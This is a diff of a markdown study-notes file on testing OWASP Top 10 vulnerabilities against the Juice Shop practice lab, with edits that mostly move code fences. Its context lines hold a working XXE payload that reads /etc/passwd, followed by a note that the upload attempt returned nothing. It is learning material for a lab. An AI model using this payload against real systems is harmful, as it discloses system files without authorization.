@@ -1,3 +1,5 @@
+```md
+
 [*] Testing OWASP Top 10 Vulnerabilities
 
 https://owasp.org/www-project-top-ten/
@@ -138,13 +140,14 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
 
 [*] We Will Use:
 
+```
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
   <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
-
+```md
 [*] Bad News: This Cant Be Executed On Our Docker Juice Shop(But We Will Try To Run)
 
 [*] There Is A Complaint Section On The Page Where We Can Upload A File. Lets Intercept The Request And Lets Upload. It Went But Nothing Came Back :-(
